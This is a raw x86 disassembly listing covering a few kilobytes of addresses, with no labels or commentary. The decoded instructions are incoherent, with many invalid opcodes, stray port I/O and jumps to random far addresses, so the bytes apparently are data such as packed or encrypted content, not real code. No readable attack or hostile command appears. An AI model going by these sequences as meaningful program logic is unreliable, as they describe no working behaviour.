  413081:	jle    0x41306f
  413083:	addr16 in al,0xa4
  413086:	mov    WORD PTR [esp+ebp*2+0x28493f2],fs
  41308d:	lds    edi,FWORD PTR [esi]
  41308f:	sar    edx,1
  413091:	das    
  413092:	in     eax,dx
  413093:	test   BYTE PTR [esi+0x6],al
  413096:	bt     DWORD PTR [edi+0x54],edx
  41309a:	pop    ebp
  41309b:	adc    BYTE PTR [esi],bh
  41309d:	pop    edi
  41309e:	call   0x4770:0xf6b370a1
  4130a5:	inc    edi
  4130a6:	pop    eax
  4130a7:	mov    bl,0x5e
  4130a9:	icebp  
  4130aa:	mov    eax,ds:0x68984250
  4130af:	inc    edx
  4130b0:	retf   0xb6ae
  4130b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130b4:	push   ds
  4130b5:	(bad)  
  4130b7:	stos   BYTE PTR es:[edi],al
  4130b8:	dec    edx
  4130b9:	outs   dx,BYTE PTR ds:[esi]
  4130ba:	loopne 0x413119
  4130bc:	scas   al,BYTE PTR es:[edi]
  4130bd:	sub    ebp,DWORD PTR [ebx+0x4]
  4130c0:	inc    edx
  4130c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4130c2:	mov    ah,0xe9
  4130c4:	pusha  
  4130c5:	hlt    
  4130c6:	xchg   ebp,eax
  4130c7:	sbb    eax,0x28054087
  4130cc:	fldenv [eax-0x2]
  4130cf:	and    bl,ah
  4130d1:	sti    
  4130d2:	dec    eax
  4130d3:	push   0xe8e10659
  4130d8:	push   ebx
  4130d9:	iret   
  4130da:	pop    eax
  4130db:	cmp    bl,ch
  4130dd:	inc    esp
  4130de:	std    
  4130df:	rcr    BYTE PTR [eax+ebx*8],0x32
  4130e3:	outs   dx,BYTE PTR ds:[esi]
  4130e4:	pop    ds
  4130e5:	and    al,BYTE PTR [edi-0xc]
  4130e8:	sbb    BYTE PTR [edx+0x67],bl
  4130eb:	dec    eax
  4130ec:	into   
  4130ed:	mov    bl,BYTE PTR [edx+0x3e1c86b4]
  4130f3:	or     al,0x32
  4130f5:	and    dh,ch
  4130f7:	push   ebx
  4130f8:	icebp  
  4130f9:	loope  0x413123
  4130fb:	in     eax,dx
  4130fc:	nop
  4130fd:	fdiv   DWORD PTR [ecx]
  4130ff:	mov    eax,ds:0x130be428
  413104:	fstp   QWORD PTR [eax]
  413106:	inc    ebp
  413107:	xchg   edi,eax
  413108:	lock out 0x25,eax
  41310b:	mov    dl,BYTE PTR [ebx+0x60accc60]
  413111:	dec    ecx
  413112:	jmp    0x41312d
  413114:	mov    cl,0x41
  413116:	pop    eax
  413117:	mov    edi,0xd263204e
  41311c:	pop    es
  41311d:	sar    BYTE PTR [ebx-0x7b],0x5c
  413121:	xor    esp,DWORD PTR [esi+0x38]
  413124:	pop    esi
  413125:	mov    bh,0xb6
  413127:	cld    
  413128:	jg     0x41314d
  41312a:	test   esp,ecx
  41312c:	je     0x41318e
  41312e:	les    edi,FWORD PTR [esp+eiz*2+0x57]
  413132:	xchg   ebp,eax
  413133:	popf   
  413134:	sbb    eax,0x9870ee5b
  413139:	pop    esp
  41313a:	pop    ebx
  41313b:	xor    ah,bh
  41313d:	test   BYTE PTR [edi+0x6ac6a9a1],0xec
  413144:	jae    0x413152
  413146:	mov    bl,0xc5
  413148:	pop    esi
  413149:	mov    BYTE PTR [eax],al
  41314b:	and    DWORD PTR [edi],esi
  41314d:	int    0xb2
  41314f:	dec    ebx
  413150:	loop   0x4131b2
  413152:	scas   al,BYTE PTR es:[edi]
  413153:	into   
  413154:	out    dx,eax
  413155:	aaa    
  413156:	pop    esp
  413157:	push   0xa7e3054c
  41315c:	aaa    
  41315d:	or     DWORD PTR [eax+eiz*1-0x39267b4f],ebp
  413164:	cwde   
  413165:	mov    ds:0x8c9f97e9,al
  41316a:	mov    ebp,0x9ec9b5a1
  41316f:	jo     0x4131d1
  413171:	test   edi,ebx
  413173:	cmp    dl,BYTE PTR [edx+esi*8+0x66]
  413177:	mov    bl,BYTE PTR [esi-0x38]
  41317a:	jbe    0x413126
  41317c:	add    BYTE PTR [edx+0x55],bh
  41317f:	mov    eax,ds:0xe2af94af
  413184:	xor    esi,DWORD PTR [ebp+0x22]
  413187:	aam    0x5e
  413189:	sbb    dh,BYTE PTR [eax+edx*2+0x5e13218a]
  413190:	cmc    
  413191:	pusha  
  413192:	cwde   
  413193:	sbb    BYTE PTR [edx],bh
  413195:	inc    eax
  413196:	or     esi,ecx
  413198:	push   edi
  413199:	(bad)  
  41319a:	out    dx,al
  41319b:	in     eax,0x84
  41319d:	aad    0x5c
  41319f:	mov    ds:0xa0d11644,al
  4131a4:	stc    
  4131a5:	or     eax,0x800950d2
  4131aa:	jle    0x4131c1
  4131ac:	pop    esi
  4131ad:	hlt    
  4131ae:	inc    edx
  4131af:	jb     0x413199
  4131b1:	or     eax,ebp
  4131b3:	jmp    DWORD PTR [ebp+0x60]
  4131b6:	(bad)  
  4131b8:	stc    
  4131b9:	mov    edi,0x8499a971
  4131be:	sub    BYTE PTR [esi+0x4387f15e],0x72
  4131c5:	inc    esp
  4131c6:	call   0xd9a450d2
  4131cb:	call   DWORD PTR [ebx-0x48]
  4131ce:	(bad)  [eax-0x5a]
  4131d1:	out    dx,al
  4131d2:	and    eax,0xeb3ae501
  4131d7:	shl    DWORD PTR [ebx],0xcb
  4131da:	or     DWORD PTR [ecx+ecx*4],edi
  4131dd:	add    ch,al
  4131df:	push   ecx
  4131e0:	sub    esp,DWORD PTR [ecx-0x35]
  4131e3:	push   cs
  4131e4:	jno    0x4131e0
  4131e6:	cld    
  4131e7:	(bad)  
  4131e8:	(bad)  
  4131ea:	out    dx,eax
  4131eb:	inc    edi
  4131ec:	cli    
  4131ed:	pop    ss
  4131ee:	add    ebx,DWORD PTR es:[ebx]
  4131f1:	and    ebx,DWORD PTR [edx+0x38d00601]
  4131f7:	mov    eax,ds:0xf8e41cde
  4131fc:	je     0x41327d
  4131fe:	loop   0x413266
  413200:	pop    ebp
  413201:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413202:	pop    edx
  413203:	and    BYTE PTR [ecx+edx*2+0x619aa590],ah
  41320a:	shl    BYTE PTR [eax+0x4b5fcc61],cl
  413210:	dec    ebp
  413211:	and    BYTE PTR [edi],cl
  413213:	mov    ebx,0xeb8fba5d
  413218:	mov    eax,ds:0xa6dd4687
  41321d:	outs   dx,DWORD PTR ds:[esi]
  41321e:	sub    ebx,ecx
  413220:	daa    
  413221:	(bad)  
  413223:	push   cs
  413224:	out    0xb3,al
  413226:	into   
  413227:	jg     0x4131de
  413229:	arpl   ax,bx
  41322b:	sbb    eax,0x593e4864
  413230:	mov    esp,0xcf40900
  413235:	dec    esi
  413236:	adc    DWORD PTR [eax+0x59c919c5],ebp
  41323c:	cmp    DWORD PTR [ebp-0xf412d79],0x8c5f99ef
  413246:	addr16 pop ebp
  413248:	mov    ebp,0x4134489e
  41324d:	icebp  
  41324e:	mov    esi,0xe36085f3
  413253:	push   eax
  413254:	addr16 test al,0x96
  413257:	mov    ds:0xacee67a5,al
  41325c:	add    bh,bh
  41325e:	inc    ebx
  41325f:	fcom   DWORD PTR [edx+0x70a12333]
  413265:	cmp    BYTE PTR [ebp-0x7d],0xc6
  413269:	sub    DWORD PTR [esi-0x1469a637],ebx
  41326f:	call   0x47a87aba
  413274:	scas   al,BYTE PTR es:[edi]
  413275:	inc    edx
  413276:	sub    al,0x1f
  413278:	xor    eax,0x33d0153
  41327d:	dec    ecx
  41327e:	pusha  
  41327f:	loope  0x4132eb
  413281:	shr    ebp,0xfd
  413284:	std    
  413285:	jbe    0x413275
  413287:	add    al,0x61
  413289:	lea    esi,[edx-0x600408e5]
  41328f:	test   al,0x92
  413291:	cmp    eax,0xe141ff27
  413296:	ret    0x46a5
  413299:	out    0x4a,eax
  41329b:	xchg   DWORD PTR [edi],esi
  41329d:	jnp    0x413275
  41329f:	mov    al,ds:0xc37f6ccd
  4132a4:	cdq    
  4132a5:	jmp    0x688c:0xec3ea636
  4132ac:	iret   
  4132ad:	pushf  
  4132ae:	pop    eax
  4132af:	mov    eax,ds:0xdfc866c3
  4132b4:	mov    DWORD PTR [edx],esi
  4132b6:	out    dx,al
  4132b7:	push   0x9f8913eb
  4132bc:	adc    al,0x80
  4132be:	adc    al,0xc7
  4132c0:	lods   eax,DWORD PTR ds:[esi]
  4132c1:	popa   
  4132c2:	lea    esp,[ecx-0xcbf0df9]
  4132c8:	test   al,0x37
  4132ca:	out    dx,al
  4132cb:	mov    cl,0x1b
  4132cd:	push   0xffffffff
  4132cf:	mov    ebp,0x28f6b0ec
  4132d4:	repnz pusha 
  4132d6:	push   edx
  4132d7:	jne    0x4132d9
  4132d9:	xor    al,0xa8
  4132db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132dc:	not    esi
  4132de:	jmp    0x4132f6
  4132e0:	dec    esi
  4132e1:	jns    0x41330b
  4132e3:	nop
  4132e4:	fwait
  4132e5:	mov    BYTE PTR [esi+0x51],bh
  4132e8:	xor    BYTE PTR [edx+eiz*2-0x4c],al
  4132ec:	out    0xa0,al
  4132ee:	push   ecx
  4132ef:	jo     0x413354
  4132f1:	push   esi
  4132f2:	int    0xb9
  4132f4:	pop    esi
  4132f5:	pop    ss
  4132f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132f7:	sub    eax,DWORD PTR [eax-0x158c08b8]
  4132fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4132fe:	sub    eax,0x2560de77
  413303:	dec    ebp
  413304:	or     DWORD PTR [eax],edi
  413306:	inc    edi
  413307:	inc    ecx
  413308:	test   BYTE PTR [ebp+0x59bebaa6],0x4d
  41330f:	xchg   ecx,eax
  413310:	dec    ebx
  413311:	xor    al,0x81
  413313:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413314:	pop    esi
  413315:	popa   
  413316:	(bad)  
  413317:	mov    esp,0x8ddb1609
  41331c:	push   edi
  41331d:	clc    
  41331e:	xor    al,0xe3
  413320:	mov    ebp,0xde37fa6e
  413325:	xchg   ebp,eax
  413326:	push   eax
  413327:	nop
  413328:	inc    edi
  413329:	(bad)  
  41332a:	cld    
  41332b:	ret    
  41332c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41332d:	addr16 out dx,al
  41332f:	std    
  413330:	scas   eax,DWORD PTR es:[edi]
  413331:	adc    DWORD PTR [esi],edx
  413333:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413334:	and    DWORD PTR [eax+0x1d],0x2b9e8f1a
  41333b:	xchg   esp,eax
  41333c:	mov    edi,DWORD PTR [edx-0x1e]
  41333f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413340:	jmp    0xf75e:0x1d6bee0f
  413347:	sub    eax,0xa19750f1
  41334c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41334d:	xor    BYTE PTR [esi+eax*8+0x1c70a989],bl
  413354:	push   ebx
  413355:	loope  0x41334a
  413357:	cmp    eax,0xcd07135e
  41335c:	sub    eax,0x18c8f68f
  413361:	out    dx,al
  413362:	out    dx,al
  413363:	in     eax,0xb7
  413365:	lahf   
  413366:	addr16 cli 
  413368:	sub    ebp,DWORD PTR [esi]
  41336a:	out    dx,al
  41336b:	mov    ebp,0x8110f337
  413370:	mov    al,ds:0xbda0fbbc
  413375:	(bad)  
  413377:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413378:	mov    eax,ds:0x6328c234
  41337d:	in     eax,0x93
  41337f:	lds    eax,FWORD PTR [ebx]
  413381:	and    BYTE PTR [esi],bl
  413383:	shl    BYTE PTR [eax],1
  413385:	stos   DWORD PTR es:[edi],eax
  413386:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  413388:	mov    bl,0x42
  41338a:	ror    DWORD PTR [edx],0x9e
  41338d:	pusha  
  41338e:	pop    ecx
  41338f:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  413391:	jl     0x41338e
  413393:	or     ebp,edi
  413395:	push   0x7e
  413397:	jl     0x4133f4
  413399:	popf   
  41339a:	call   0x87dcc3cf
  41339f:	out    dx,al
  4133a0:	int    0x48
  4133a2:	(bad)  
  4133a4:	cmp    BYTE PTR [ebx+ebx*4-0x5f],0x7c
  4133a9:	xchg   edi,eax
  4133aa:	push   ebx
  4133ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4133ac:	out    0x1a,eax
  4133ae:	pop    ds
  4133af:	leave  
  4133b0:	fs int 0xd2
  4133b3:	inc    eax
  4133b4:	cmc    
  4133b5:	add    ah,bl
  4133b7:	addr16 pop eax
  4133b9:	mov    ecx,0x9dcca190
  4133be:	pop    ss
  4133bf:	ss dec ebp
  4133c1:	aam    0x25
  4133c3:	(bad)  
  4133c4:	dec    ebx
  4133c5:	mov    ds:0x265e34be,al
  4133ca:	or     eax,0x853bfb02
  4133cf:	mov    eax,ds:0xe0823acd
  4133d4:	pop    DWORD PTR [esi-0x52836eb2]
  4133da:	out    dx,al
  4133db:	jp     0x413440
  4133dd:	mov    cl,0xb9
  4133df:	pop    esp
  4133e0:	dec    esp
  4133e1:	into   
  4133e2:	fcmove st,st(0)
  4133e4:	(bad)  
  4133e5:	ins    DWORD PTR es:[edi],dx
  4133e6:	fisub  WORD PTR [eax-0x2248a1bf]
  4133ec:	push   0x5ea7a585
  4133f1:	mov    BYTE PTR [ebp-0x756e4456],bh
  4133f7:	sub    eax,0xed4fe878
  4133fc:	and    esp,DWORD PTR [edi+0x1]
  4133ff:	adc    eax,0xb3bf755e
  413404:	sbb    BYTE PTR es:[ecx+0x38c85e74],bh
  41340b:	sub    ebp,edi
  41340d:	shr    BYTE PTR [ecx-0x2b9ea77a],cl
  413413:	push   esp
  413414:	test   BYTE PTR [esi-0x62],0x1b
  413418:	xor    eax,0x8be0ebf8
  41341d:	sahf   
  41341e:	in     al,0x34
  413420:	(bad)  
  413421:	mov    ebp,0x1252098d
  413426:	xchg   edi,eax
  413427:	mov    ds:0x70f59a38,al
  41342c:	jbe    0x97598d52
  413432:	out    dx,al
  413433:	xor    DWORD PTR ds:0x57206c9b,esi
  413439:	sbb    esp,esp
  41343b:	mov    al,ds:0x9da279b0
  413440:	sbb    dl,BYTE PTR [ebp+0x675353ec]
  413446:	jns    0x413400
  413448:	repz pusha 
  41344a:	in     eax,0x65
  41344c:	(bad)  [ebx+0x59da216f]
  413452:	xchg   ebx,eax
  413453:	xchg   ecx,eax
  413454:	inc    ecx
  413455:	std    
  413456:	ja     0x413489
  413458:	leave  
  413459:	jmp    0x413422
  41345b:	mov    edi,0xc9ae3263
  413460:	fsub   DWORD PTR [eax+0x14]
  413463:	(bad)  
  413464:	aas    
  413465:	add    al,0xd9
  413467:	xchg   edx,eax
  413468:	je     0x41345e
  41346a:	pop    ds
  41346b:	jno    0x413498
  41346d:	push   es
  41346e:	out    dx,al
  41346f:	aad    0x4c
  413471:	nop
  413472:	add    BYTE PTR [edi-0x5f],bl
  413475:	fld    TBYTE PTR [eax]
  413477:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413478:	test   ebx,edi
  41347a:	mov    ah,al
  41347c:	scas   eax,DWORD PTR es:[edi]
  41347d:	lds    ebx,FWORD PTR [esi-0x7a]
  413480:	dec    edi
  413481:	shl    edi,0x32
  413484:	repnz pop esp
  413486:	rcr    BYTE PTR ds:0xfa156037,cl
  41348c:	xchg   edi,eax
  41348d:	inc    esi
  41348e:	fmulp  st(1),st
  413490:	imul   esp,DWORD PTR [eax+0x11],0x20
  413494:	adc    al,0x51
  413496:	pop    esp
  413497:	pop    ebp
  413498:	jge    0x413446
  41349a:	out    dx,al
  41349b:	xor    ebx,ebx
  41349d:	(bad)  
  41349f:	sbb    al,0xc6
  4134a1:	pop    ebp
  4134a2:	dec    ecx
  4134a3:	test   al,0x44
  4134a5:	sbb    bh,ch
  4134a7:	imul   eax,edx,0xfffffff0
  4134aa:	das    
  4134ab:	jo     0x413495
  4134ad:	scas   eax,DWORD PTR es:[edi]
  4134ae:	dec    ebp
  4134af:	icebp  
  4134b0:	inc    esi
  4134b1:	mov    dh,0x1
  4134b3:	sub    al,0xc3
  4134b5:	retf   0x27e7
  4134b8:	lahf   
  4134b9:	stos   DWORD PTR es:[edi],eax
  4134ba:	(bad)  
  4134bb:	mov    cl,0x35
  4134bd:	imul   ebx,DWORD PTR [edi-0x53f7b35c],0x55a8268f
  4134c7:	and    dl,BYTE PTR [eax+0x5ea2cd70]
  4134cd:	jmp    0x413474
  4134cf:	cmp    BYTE PTR [ecx-0x6d32d17d],bl
  4134d5:	pop    ecx
  4134d6:	sbb    DWORD PTR [eax],ecx
  4134d8:	inc    ebp
  4134d9:	mov    BYTE PTR [eax+eiz*8+0x68c90bcf],bh
  4134e0:	pop    ebp
  4134e1:	sub    ebp,eax
  4134e3:	retf   
  4134e4:	xor    al,0x34
  4134e6:	inc    esp
  4134e7:	mov    bl,BYTE PTR [esi-0x1b5e95e2]
  4134ed:	push   0x47
  4134ef:	push   esp
  4134f0:	lahf   
  4134f1:	loopne 0x41347e
  4134f3:	push   ss
  4134f4:	pop    esi
  4134f5:	cs jmp 0x868b572b
  4134fb:	out    0x6d,eax
  4134fd:	test   al,0x1c
  4134ff:	test   al,0x1d
  413501:	sub    eax,0xed5ffeca
  413507:	(bad)  
  413508:	and    esp,DWORD PTR [ebp+0x5c5a53f0]
  41350e:	ror    BYTE PTR [edi+0x79],1
  413511:	repz imul esp,DWORD PTR [edx],0xb66e2451
  413518:	sub    ebx,DWORD PTR [esi-0x6a]
  41351b:	and    eax,0x6cf96085
  413520:	or     BYTE PTR [edx+ecx*4-0x11f778b9],dl
  413527:	not    BYTE PTR [eax+eiz*1+0x5567ae05]
  41352e:	rcr    DWORD PTR [edx-0x42a56255],1
  413534:	leave  
  413535:	pop    ecx
  413536:	lods   al,BYTE PTR ds:[esi]
  413537:	or     eax,0xfba3d07d
  41353c:	mov    esp,0x1f06ecaa
  413541:	mov    DWORD PTR [eax-0x6e],eax
  413544:	cmp    eax,0xfb43d621
  413549:	pusha  
  41354a:	pop    esi
  41354b:	inc    edx
  41354c:	xchg   eax,ebx
  41354e:	arpl   WORD PTR [edx+0x1a],sp
  413551:	add    DWORD PTR ds:0x64dffeac,esp
  413557:	loope  0x4134f5
  413559:	push   eax
  41355a:	imul   DWORD PTR [ecx]
  41355c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41355d:	mov    eax,ds:0x8023a11c
  413562:	and    cl,BYTE PTR [eax+0x8]
  413565:	inc    ebp
  413566:	inc    ebx
  413567:	rcr    BYTE PTR [esi+0x36],0xc6
  41356b:	dec    edx
  41356c:	mov    al,0x1f
  41356e:	add    eax,0xcd606cdf
  413573:	jb     0x4135c3
  413575:	and    bh,BYTE PTR [esp+ebx*2-0x7011b27f]
  41357c:	jne    0x41351e
  41357e:	retf   
  41357f:	ja     0x4135ae
  413581:	push   edi
  413582:	aad    0xa0
  413584:	adc    esi,ebx
  413586:	push   esi
  413587:	sub    BYTE PTR [edi+0x17],bl
  41358a:	ret    0x5eba
  41358d:	pushf  
  41358e:	pushf  
  41358f:	cld    
  413590:	stos   DWORD PTR es:[edi],eax
  413591:	gs adc eax,0xe8608230
  413597:	aam    0x69
  413599:	xor    al,0x8f
  41359b:	xchg   ebp,eax
  41359c:	push   es
  41359d:	pop    esp
  41359e:	out    dx,al
  41359f:	mov    cl,0xed
  4135a1:	fdiv   st(6),st
  4135a3:	mov    BYTE PTR [ecx+edi*8+0x2acda137],bl
  4135aa:	stc    
  4135ab:	jecxz  0x41355c
  4135ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4135ae:	inc    edx
  4135af:	adc    ebx,DWORD PTR [esi+0x10]
  4135b2:	in     al,0xc9
  4135b4:	jne    0x4135a1
  4135b6:	mov    cl,0xd7
  4135b8:	mov    DWORD PTR [eax+0x1b],esp
  4135bb:	push   es
  4135bc:	fst    QWORD PTR [edi-0x25814033]
  4135c2:	out    0x7e,eax
  4135c4:	sbb    al,BYTE PTR [esi+eiz*8]
  4135c7:	(bad)  
  4135c8:	cs jecxz 0x4135ad
  4135cb:	mov    eax,0x2b7613a
  4135d0:	dec    ebp
  4135d1:	adc    al,0x9b
  4135d3:	push   es
  4135d4:	in     eax,dx
  4135d5:	push   edx
  4135d6:	out    0xe5,eax
  4135d8:	mov    edi,0x5eaaf7a6
  4135dd:	inc    edi
  4135de:	mov    esp,0x9260e151
  4135e3:	ror    bh,1
  4135e5:	ret    
  4135e6:	icebp  
  4135e7:	hlt    
  4135e8:	add    cl,BYTE PTR [ebp-0x46f4a2f8]
  4135ee:	out    dx,al
  4135ef:	imul   esp,DWORD PTR [eax-0x33b80c8],0x5c
  4135f6:	mov    eax,0x20517427
  4135fb:	popa   
  4135fc:	push   cs
  4135fd:	push   ds
  4135fe:	das    
  4135ff:	pop    edx
  413600:	cmp    bh,BYTE PTR [ebp-0x43]
  413603:	push   ebx
  413604:	pop    esi
  413605:	or     BYTE PTR [ebx-0x2d308e34],0xa7
  41360c:	adc    BYTE PTR [ebx+esi*1-0x693ec931],al
  413613:	lods   al,BYTE PTR ds:[esi]
  413614:	fisttp DWORD PTR [ebx-0x3c715212]
  41361a:	pop    edi
  41361b:	cmp    eax,0xe057f05a
  413620:	aas    
  413621:	mov    ch,0x60
  413623:	mov    eax,ds:0x1d37833b
  413628:	test   al,0x6b
  41362a:	jecxz  0x4135b8
  41362c:	aam    0xee
  41362e:	xlat   BYTE PTR ds:[ebx]
  41362f:	loopne 0x4135f0
  413631:	scas   eax,DWORD PTR es:[edi]
  413632:	pop    esi
  413633:	loopne 0x413602
  413635:	mov    dh,ch
  413637:	jne    0x4135f3
  413639:	cmp    ebp,DWORD PTR [edi]
  41363b:	ins    DWORD PTR es:[edi],dx
  41363c:	sti    
  41363d:	dec    eax
  41363e:	push   esi
  41363f:	xchg   edi,eax
  413640:	das    
  413641:	cld    
  413642:	call   0xa137d6e7
  413647:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413648:	push   0x2d4dee44
  41364d:	inc    edi
  41364e:	sbb    dh,ch
  413650:	xor    eax,0x7fa198ee
  413655:	enter  0xb87e,0x65
  413659:	(bad)  
  41365a:	inc    ebp
  41365b:	push   ebp
  41365c:	outs   dx,BYTE PTR ds:[esi]
  41365d:	mov    edi,0xd671f9ee
  413662:	lea    eax,[eax-0x15ed16e8]
  413668:	push   cs
  413669:	popa   
  41366a:	fbld   TBYTE PTR [edi+0x26]
  41366d:	rcr    ebp,0xa
  413670:	push   es
  413671:	mov    esp,0xafebe5e7
  413676:	sbb    dh,bl
  413678:	ficomp WORD PTR [eax+esi*8-0x24]
  41367c:	cmp    al,0x61
  41367e:	push   esi
  41367f:	daa    
  413680:	jle    0x4136ad
  413682:	mov    edx,0x6657ea55
  413687:	ins    BYTE PTR es:[edi],dx
  413688:	pop    esi
  413689:	adc    ch,BYTE PTR [edx]
  41368b:	push   ss
  41368c:	and    DWORD PTR [ebx+ecx*8-0x35],0x76a4613c
  413694:	jmp    0x4136de
  413696:	cmp    al,dh
  413698:	cdq    
  413699:	pop    ebp
  41369a:	out    dx,al
  41369b:	inc    ebp
  41369c:	nop
  41369d:	lahf   
  41369e:	pop    eax
  41369f:	in     al,dx
  4136a0:	jmp    0xc719:0x8794fa98
  4136a7:	jne    0x413707
  4136a9:	inc    ecx
  4136aa:	mov    ?,WORD PTR [esi]
  4136ac:	dec    ebx
  4136ad:	out    dx,eax
  4136ae:	outs   dx,BYTE PTR ds:[esi]
  4136af:	xor    eax,0x215aca35
  4136b4:	das    
  4136b5:	shr    ah,0x3
  4136b8:	mov    ebp,0x2c7b1a6b
  4136bd:	sub    eax,0xbdf2a5a1
  4136c2:	int3   
  4136c3:	inc    edi
  4136c4:	push   ds
  4136c5:	imul   esi
  4136c7:	ror    DWORD PTR [edx],0x99
  4136ca:	loopne 0x4136d1
  4136cc:	aaa    
  4136cd:	dec    ecx
  4136ce:	mov    ebx,0x12027a9e
  4136d3:	aas    
  4136d4:	pop    esi
  4136d5:	jnp    0x41372b
  4136d7:	xor    DWORD PTR [ebx-0x7d4ff069],0x5e4b2267
  4136e1:	pusha  
  4136e2:	adc    eax,0xa41313ca
  4136e7:	popf   
  4136e8:	pusha  
  4136e9:	popf   
  4136ea:	add    ebx,ebp
  4136ec:	retf   0x3b63
  4136ef:	js     0x4136ef
  4136f1:	retf   0x6b95
  4136f4:	pop    esi
  4136f5:	lea    ebp,[eax-0xe476b35]
  4136fb:	jne    0x41377a
  4136fd:	inc    edx
  4136fe:	imul   ebx,DWORD PTR [edi+0x56c02159],0x48cf7890
  413708:	pusha  
  413709:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41370a:	out    dx,eax
  41370b:	rol    DWORD PTR [edi+0x5e814e99],0xfb
  413712:	jge    0x4136c3
  413714:	(bad)  
  413715:	aad    0x26
  413717:	pop    eax
  413718:	pop    esi
  413719:	inc    esi
  41371a:	fwait
  41371b:	push   ebx
  41371c:	jge    0x4136a0
  41371e:	(bad)  
  41371f:	je     0x413793
  413721:	or     eax,0xc14ed9ee
  413726:	jmp    0xd4512e7e
  41372b:	jo     0x413778
  41372d:	pusha  
  41372e:	dec    esp
  41372f:	inc    eax
  413730:	jg     0x4136b7
  413732:	lds    esi,FWORD PTR [ecx+0x79]
  413735:	xchg   esp,eax
  413736:	xchg   ebp,eax
  413737:	icebp  
  413738:	pop    edi
  413739:	xor    eax,0xf5375687
  41373e:	inc    esi
  41373f:	inc    ecx
  413740:	pop    ss
  413741:	xchg   ebx,eax
  413742:	mov    eax,fs:0x5a864cab
  413748:	adc    esp,DWORD PTR [ebp-0x1aa1cdd2]
  41374e:	push   esp
  41374f:	shl    edx,cl
  413751:	push   ecx
  413752:	sbb    eax,DWORD PTR [ecx+0x393a5a0d]
  413758:	dec    edx
  413759:	loop   0x413725
  41375b:	and    BYTE PTR [ebp+edi*8+0x2c],0xf6
  413760:	js     0x41378c
  413762:	out    dx,al
  413763:	sbb    dh,bh
  413765:	imul   ecx,DWORD PTR [ebx-0x569c2085],0xffffff8e
  41376c:	lar    edi,WORD PTR [ecx+0x58c75fa0]
  413773:	repz xor eax,0x14c15184
  413779:	jb     0x413769
  41377b:	ds jno 0x41371d
  41377e:	fild   DWORD PTR [ecx+0x4]
  413781:	mov    ah,0x87
  413783:	mov    eax,ds:0x72257e51
  413788:	jmp    0x5ec07404
  41378d:	mov    WORD PTR [edi],es
  41378f:	jge    0x4137af
  413791:	(bad)  
  413792:	mov    edi,0x86615ab0
  413797:	push   ss
  413798:	push   es
  413799:	lock push ebx
  41379b:	pop    eax
  41379c:	dec    ebx
  41379d:	stc    
  41379e:	out    dx,al
  41379f:	push   esp
  4137a0:	jns    0x413794
  4137a2:	jl     0x4137f5
  4137a4:	add    ch,BYTE PTR [ebp+0x2c]
  4137a7:	test   ebp,eax
  4137a9:	pusha  
  4137aa:	jle    0x413788
  4137ac:	xchg   edi,eax
  4137ad:	enter  0xcd5c,0xdf
  4137b1:	add    ebp,ebp
  4137b3:	mov    ch,0xfd
  4137b5:	xor    DWORD PTR [edi+0x28],0x14
  4137b9:	and    eax,0xb2573953
  4137be:	xor    al,0xa4
  4137c0:	loope  0x413766
  4137c2:	sti    
  4137c3:	cmc    
  4137c4:	pop    es
  4137c5:	mov    edx,0x56e0be5e
  4137ca:	and    BYTE PTR [edx],dh
  4137cc:	adc    BYTE PTR [eax-0xf],ah
  4137cf:	cmp    dl,BYTE PTR [edi]
  4137d1:	jmp    0xa13b:0x31a6ca64
  4137d8:	clc    
  4137d9:	push   es
  4137da:	sub    dx,si
  4137dd:	int3   
  4137de:	popa   
  4137df:	test   DWORD PTR [esi-0x66],ebx
  4137e2:	cmp    al,0xac
  4137e4:	push   eax
  4137e5:	sbb    bl,BYTE PTR [ecx-0xd]
  4137e8:	(bad)  
  4137e9:	pop    ebp
  4137ea:	mov    dl,0xb8
  4137ec:	or     al,0xce
  4137ee:	lods   eax,DWORD PTR ds:[esi]
  4137ef:	push   ecx
  4137f0:	mov    ?,ebp
  4137f2:	dec    edi
  4137f3:	dec    eax
  4137f4:	pop    esi
  4137f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137f6:	cmp    al,0x8
  4137f8:	jg     0x413829
  4137fa:	les    esp,FWORD PTR [edx+0x45da676d]
  413800:	fimul  WORD PTR [ebx-0x4acc2cf]
  413806:	ror    DWORD PTR [ebx-0xef70ea5],1
  41380c:	ja     0x4137d4
  41380e:	sahf   
  41380f:	ret    0x24a9
  413812:	adc    al,0xa1
  413814:	js     0x41382a
  413816:	jne    0x4137c9
  413818:	jle    0x413835
  41381a:	xor    ah,bl
  41381c:	pop    edi
  41381d:	test   bh,bh
  41381f:	jle    0x413877
  413821:	cmp    ecx,esi
  413823:	sub    dh,dh
  413825:	addr16 or eax,0xab953ea4
  41382b:	sub    dl,ch
  41382d:	jae    0x413895
  41382f:	outs   dx,DWORD PTR ds:[esi]
  413830:	jmp    0x41385c
  413832:	add    BYTE PTR [edi],dh
  413834:	ret    0xee55
  413837:	cmp    eax,ecx
  413839:	lock ins DWORD PTR es:[edi],dx
  41383b:	xor    eax,0xcea35f84
  413840:	adc    bh,ah
  413842:	dec    ebp
  413843:	jmp    0x6250c192
  413848:	mov    ch,bh
  41384a:	out    dx,al
  41384b:	xor    dh,BYTE PTR [edx]
  41384d:	sub    bh,dh
  41384f:	or     eax,0xf2cce7d3
  413854:	jle    0x4138b6
  413856:	or     al,0x7d
  413858:	leave  
